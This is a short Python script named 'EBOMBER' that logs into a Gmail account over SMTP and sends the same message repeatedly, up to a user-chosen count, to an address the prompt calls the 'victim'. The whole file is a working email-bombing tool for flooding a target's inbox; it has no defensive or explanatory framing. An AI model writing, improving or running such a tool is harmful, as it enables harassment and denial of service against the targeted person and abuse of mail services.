import os
import smtplib
import sys


print('EBOMBER')
print('KhmHeh')

print()

user = input('Your mailing address: ')
passwd = input('Password from him: ')
to = input("Victim's mailing address: ")
body = input('Message: ')
total = int(input('Number of messages: '))

smtp_server = 'smtp.gmail.com'
port = 587
print()

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(user,passwd)
    for i in range(1,total+1):
        subject = os.urandom(9)
        server.sendmail(user,to,body)
        print("\rMessages sent: %i" % i)
        sys.stdout.flush()
    server.quit()
    print('\nDone !!')
except smtplib.SMTPAuthenticationError:
    print('\n[!] Incorrect email address or password.')
    sys.exit()
